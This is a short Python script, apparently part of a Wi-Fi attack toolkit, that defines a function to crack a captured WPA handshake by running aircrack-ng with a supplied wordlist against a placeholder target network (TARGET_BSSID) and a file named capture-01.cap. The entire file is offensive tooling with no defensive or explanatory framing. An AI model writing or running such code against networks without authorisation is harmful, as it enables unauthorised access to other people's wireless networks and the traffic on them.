import subprocess
import os

def crack_handshake(wordlist_path):
    print("[+] Cracking WPA Handshake...")
    cap_file = "capture-01.cap"
    if not os.path.exists(cap_file):
        print("[!] No capture file found.")
        return
    subprocess.run(["aircrack-ng", "-w", wordlist_path, "-b", "TARGET_BSSID", cap_file])
